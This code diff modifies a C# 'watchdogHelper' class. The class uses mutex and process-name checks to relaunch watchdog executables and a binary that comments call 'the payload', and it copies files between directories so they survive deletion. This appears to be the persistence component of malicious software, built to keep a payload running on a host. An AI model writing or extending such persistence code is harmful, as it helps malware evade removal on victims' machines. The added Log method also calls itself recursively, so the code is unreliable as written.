@@ -3,15 +3,15 @@ using System.Diagnostics;
 using System.IO;
 using System.Threading;
 
-namespace watchdogHelper
-{
+
     public class watchdogHelper
     {
 
-        public static bool IsMutexRunning(string mutexName)
+        private static bool IsMutexRunning(string mutexName)
         {
             bool isNewInstance;
-
+        try
+        {
             // Attempt to create a mutex with the specified name
             using (Mutex mutex = new Mutex(false, mutexName, out isNewInstance))
             {
@@ -28,18 +28,31 @@ namespace watchdogHelper
                 }
             }
         }
+        catch (Exception ex) {
+            Log($"Error verifying if mutex is running: {ex.Message}");
+            return false;
+        }
+        }
 
-        public static bool IsProcessRunning(string processName)
+        private static bool IsProcessRunning(string processName)
         {
             // Get a list of processes by name
             processName = processName.Replace(".exe", "");
 
-            Process[] processes = Process.GetProcessesByName(processName);
+            Process[] processes = Process.GetProcessesByName(processName); //does processes by name when mutex cant be used (for the payload)
             return processes.Length > 0;
+        }
+
+        public static void Log(string message)
+        {
+            if (Config.Debugging) //logs when specified by user in Config
+                Log(message);
         }
 
         public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
         {
+            try
+            {
             string currentDirectory = Directory.GetCurrentDirectory();
             string sourcePathFile = Path.Combine(currentDirectory, filename);
             string destPathFile = Path.Combine(destinationPath, filename);
@@ -61,11 +74,11 @@ namespace watchdogHelper
                     try
                     {
                         File.Copy(sourcePathFile, destPathFile, overwrite: false);
-                        Console.WriteLine($"'{filename}' found and copied to {destPathFile}");
+                        Log($"'{filename}' found and copied to {destPathFile}");
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine($"Error copying file: {ex.Message}");
+                        Log($"Error copying file: {ex.Message}");
                     }
                 }
                 else if (File.Exists(destPathFile))
@@ -73,22 +86,28 @@ namespace watchdogHelper
                     try
                     {
                         File.Copy(destPathFile, sourcePathFile, overwrite: false);
-                        Console.WriteLine($"'{filename}' found and copied to {sourcePathFile}");
+                        Log($"'{filename}' found and copied to {sourcePathFile}");
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine($"Error copying file: {ex.Message}");
+                        Log($"Error copying file: {ex.Message}");
                     }
                 }
                 else
                 {
-                    Console.WriteLine($"'{filename}' not found in the current directory.");
+                    Log($"'{filename}' not found in the current directory.");
                 }
             }
         }
+        catch (Exception ex) {
+            Log($"Error verifying and copying filepaths: {ex.Message}");
+        }
+        }
 
 
-        public static void runBinary(string filePath, string arguments = "")
+        private static void runBinary(string filePath, string arguments = "")
+        {
+        try
         {
             // Create a new ProcessStartInfo for the executable
             ProcessStartInfo startInfo = new ProcessStartInfo
@@ -113,7 +132,7 @@ namespace watchdogHelper
                     if (e.Data != null)
                     {
                         // Handle output data here
-                        System.Console.WriteLine(e.Data);
+                        Log($"Log from running binary: {e.Data}");
                     }
                 };
                 process.BeginOutputReadLine();
@@ -121,20 +140,24 @@ namespace watchdogHelper
                 // Note: No WaitForExit(), allowing the process to run without blocking
             }
         }
+        catch (Exception ex) { 
+        Log($"Error Running Binary: {ex.Message}");
+        }
+        }
 
 
         public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
         {
-            if (!IsMutexRunning(mutex))
-            {
+            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
+        {
                 runBinary(Path.Combine(watchdogPath, watchdogName));
             }
         }
 
         public static void CheckAndRunPayload(string payloadPath, string payloadName)
         {
-            if (!IsProcessRunning(payloadName))
-            {
+            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
+        {
                 runBinary(Path.Combine(payloadPath, payloadName));
             }
         }
@@ -151,10 +174,9 @@ namespace watchdogHelper
             catch (Exception ex)
             {
                 // Log or handle the exception here
-                Console.WriteLine($"An error occurred while creating the directory: {ex.Message}");
+                Log($"An error occurred while creating the directory: {ex.Message}");
             }
         }
 
 
     }
-}
